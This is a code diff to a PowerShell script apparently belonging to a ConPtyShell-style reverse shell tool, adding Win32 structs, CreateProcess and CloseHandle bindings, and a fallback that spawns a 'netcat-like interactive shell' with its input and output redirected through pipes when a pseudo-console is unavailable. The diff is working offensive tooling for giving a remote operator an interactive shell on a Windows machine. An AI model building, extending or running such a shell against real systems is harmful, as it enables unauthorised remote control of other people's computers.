@@ -780,7 +780,28 @@ New-Struct. :P
 $Mod = New-InMemoryModule -ModuleName Win32
 $global:Mod = $Mod
 
-$global:ProccessInformation =  struct $Mod PROCESS_INFORMATION @{
+$global:STARTUPINFO = struct $Mod STARTUPINFO @{
+    cb =            field 0 Int32
+    lpReserved =    field 1 String
+    lpDesktop =     field 2 String
+    lpTitle =       field 3 String
+    dwX =           field 4 Int32
+    dwY =           field 5 Int32
+    dwXSize =       field 6 Int32
+    dwYSize =       field 7 Int32
+    dwXCountChars = field 8 Int32
+    dwYCountChars = field 9 Int32
+    dwFillAttribute = field 10 Int32
+    dwFlags =       field 11 Int32
+    wShowWindow =   field 12 Int16
+    cbReserved2 =   field 13 Int16
+    lpReserved2 =   field 14 IntPtr
+    hStdInput =     field 15 IntPtr
+    hStdOutput =    field 16 IntPtr
+    hStdError =     field 17 IntPtr
+}
+
+$global:PROCESS_INFORMATION =  struct $Mod PROCESS_INFORMATION @{
     hProcess =      field 0 IntPtr
     hTread =        field 1 IntPtr
     dwProcessId =   field 2 int
@@ -846,9 +867,22 @@ $global:SOCKADDR_IN = struct $Mod SOCKADDR_IN @{
 }
 
 $FunctionDefinitions = @(
+    (func kernel32 CreateProcess ([Bool]) @(
+        [String], # lpApplicationName
+        [String], # lpCommandLine
+        [IntPtr], # lpProcessAttributes
+        [IntPtr], # lpThreadAttributes
+        [Bool],   # bInheritHandles
+        [UInt32], # dwCreationFlags
+        [IntPtr], # lpEnvironment,
+        [String], # lpCurrentDirectory,
+        $global:STARTUPINFO.MakeByRefType(), # lpStartupInfo,
+        $global:PROCESS_INFORMATION.MakeByRefType() # lpProcessInformation
+    )),
     (func kernel32 SetStdHandle ([IntPtr]) @([Int32], [IntPtr])),  
     (func kernel32 GetStdHandle ([IntPtr]) @([Int32])),  
-    (func kernel32 CreatePipe ([bool]) @([IntPtr].MakeByRefType(), [IntPtr].MakeByRefType(), $global:SECURITY_ATTRIBUTES_TYPE.MakeByRefType(), [UInt32]) -EntryPoint CreatePipe -SetLastError),
+    (func kernel32 CloseHandle ([Bool]) @([IntPtr])),
+    (func kernel32 CreatePipe ([Bool]) @([IntPtr].MakeByRefType(), [IntPtr].MakeByRefType(), $global:SECURITY_ATTRIBUTES_TYPE.MakeByRefType(), [UInt32]) -EntryPoint CreatePipe -SetLastError),
     (func kernel32 CreateFile ([IntPtr]) @([String], [UInt32], [UInt32], [IntPtr], [UInt32], [UInt32], [IntPtr])),
     (func kernel32 GetModuleHandle ([IntPtr]) @([String]) -SetLastError),
     (func kernel32 GetProcAddress ([IntPtr]) @([IntPtr], [String]) -Charset Ansi -SetLastError),
@@ -883,6 +917,7 @@ class ConPtyShellException : System.Exception {
 
 
 class ConPtyShell {
+    hidden static [Int32]  $STARTF_USESTDHANDLES = 0x00000100
     hidden static [int]    $BUFFER_SIZE_PIPE = 0x100000
     hidden static [UInt32] $GENERIC_READ = 2147483648
     hidden static [UInt32] $GENERIC_WRITE    = 0x40000000
@@ -1010,6 +1045,7 @@ class ConPtyShell {
         if ($Kernel32::GetProcAddress($kernel32base, 'CreatePseudoConsole') -ne [IntPtr]::Zero) {
             $conptyCompatible = $true
         }
+        $childProcessInfo = New-Object -TypeName "PROCESS_INFORMATION"
 
         [ConPtyShell]::CreatePipes([ref] $InputPipeRead, [ref] $InputPipeWrite, [ref] $OutputPipeRead, [ref] $OutputPipeWrite)
 
@@ -1038,9 +1074,23 @@ class ConPtyShell {
 
             Write-Host "CreatePseudoConsole function not found! Spawning a netcat-like interactive shell..." -ForegroundColor Yellow
 
-                        
+            $sInfo = New-Object -TypeName STARTUPINFO
+            $sInfo.cb = $global:STARTUPINFO::GetSize()
+            $sInfo.dwFlags = $sInfo.dwFlags -bor [ConPtyShell]::STARTF_USESTDHANDLES
+            $sInfo.hStdInput  = $InputPipeRead
+            $sInfo.hStdOutput = $OutputPipeWrite
+            $sInfo.hStdError  = $OutputPipeWrite
+
+            $Kernel32::CreateProcess($null, $commandLine, [IntPtr]::Zero, [IntPtr]::Zero, $true, 0, [IntPtr]::Zero, $null, [ref] $sInfo, [ref] $childProcessInfo);
         }
 
+        # Note: We can close the handles to the PTY-end of the pipes here
+        # because the handles are dup'ed into the ConHost and will be released
+        # when the ConPTY is destroyed.
+        if ($InputPipeRead -ne [IntPtr]::Zero) {$Kernel32::CloseHandle($InputPipeRead)}
+        if ($OutputPipeWrite -ne [IntPtr]::Zero) {$Kernel32::CloseHandle($OutputPipeWrite)}
+
+        
 
         $LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
         Write-Host "Err msg: " $LastError.Message
